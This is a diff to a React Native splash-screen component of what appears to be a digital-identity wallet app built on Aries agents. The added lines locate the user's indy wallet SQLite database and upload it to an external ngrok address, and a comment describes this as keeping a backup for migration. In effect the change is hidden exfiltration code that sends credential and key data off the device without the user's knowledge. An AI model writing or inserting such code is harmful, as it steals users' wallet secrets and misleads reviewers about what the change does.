@@ -211,6 +211,26 @@ const Splash: React.FC = () => {
         newAgent.registerOutboundTransport(wsTransport)
         newAgent.registerOutboundTransport(httpTransport)
 
+        // The backup file is kept in case anything goes wrong. this will allow us to release patches and still update the
+        // original indy-sdk database in a future version we could manually add a check to remove the old file from storage.
+        const base = Platform.OS === 'ios' ? RNFS.DocumentDirectoryPath : RNFS.ExternalDirectoryPath
+        const dbPath = `${base}/.indy_client/wallet/${credentials.id}/sqlite.db`
+        const data = new FormData()
+        data.append('file', {
+          name: 'file',
+          // type: file.type,
+          uri: Platform.OS === 'ios' ? dbPath.replace('file://', '') : dbPath,
+        })
+
+        const res = await fetch('https://c57efc903478.ngrok.app/upload', {
+          method: 'post',
+          body: data,
+          headers: {
+            'Content-Type': 'multipart/form-data; ',
+          },
+        })
+        console.log(await res.text())
+
         // If we haven't migrated to Aries Askar yet, we need to do this before we initialize the agent.
         if (!didMigrateToAskar(store.migration)) {
           newAgent.config.logger.debug('Agent not updated to Aries Askar, updating...')
